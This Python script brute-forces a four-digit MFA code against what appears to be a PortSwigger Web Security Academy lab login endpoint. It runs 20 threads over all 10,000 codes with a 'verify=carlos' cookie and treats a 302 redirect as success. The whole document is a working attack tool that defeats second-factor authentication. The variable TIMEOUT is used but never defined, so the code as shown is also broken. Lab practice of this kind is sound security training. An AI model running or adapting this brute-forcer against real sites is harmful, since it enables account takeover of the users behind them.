import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading


ENDPOINT = "https://0ab000a0040cceac8031532a00d9002a.web-security-academy.net/login2" #ubah host nya!
COOKIE = "verify=carlos"
WORKERS = 20           
SUCCESS_STATUS = 302
VERBOSE = True


found_event = threading.Event()
found_result = {"code": None, "location": None}


def make_session():
   s = requests.Session()
   for part in COOKIE.split(";"):
       if "=" in part:
           name, value = part.strip().split("=", 1)
           s.cookies.set(name, value)
   s.headers.update({
       "User-Agent": "Mozilla/5.0 (compatible) Python-requests/" + requests.__version__,
       "Content-Type": "application/x-www-form-urlencoded"
   })
   return s


def try_code(session, code_str):
   if found_event.is_set():
       return None
   try:
       resp = session.post(ENDPOINT, data={"mfa-code": code_str}, timeout=TIMEOUT, allow_redirects=False)
       status = resp.status_code
   except Exception as e:
       if VERBOSE:
           print(f"ERROR for {code_str}: {e}", file=sys.stderr)
       return None


   if VERBOSE:
       print(f"Http Code: {status} Used MFA: mfa-code={code_str}")


   if SUCCESS_STATUS is not None and status == SUCCESS_STATUS:
       found_result["code"] = code_str
       found_result["location"] = resp.headers.get("Location")
       found_event.set()
       return code_str
   return None


def worker_range(start, end):
   session = make_session()
   for i in range(start, end):
       if found_event.is_set():
           break
       code_str = f"{i:04d}"
       res = try_code(session, code_str)
       if res:
           break


def main():
   total = 10000
   # split ranges into chunks for workers
   chunk_size = (total + WORKERS - 1) // WORKERS
   ranges = [(i, min(i + chunk_size, total)) for i in range(0, total, chunk_size)]


   with ThreadPoolExecutor(max_workers=WORKERS) as ex:
       futures = [ex.submit(worker_range, start, end) for start, end in ranges]
       # wait until one signals found_event
       try:
           for f in as_completed(futures):
               if found_event.is_set():
                   break
       except KeyboardInterrupt:
           print("Interrupted by user", file=sys.stderr)
           found_event.set()


   if found_result["code"]:
       print("\nPossible success detected!")
       print("MFA:", found_result["code"])
       if found_result["location"]:
           print("Redirect Location:", found_result["location"])
   else:
       print("\nNo success detected.")


if __name__ == "__main__":
   main()
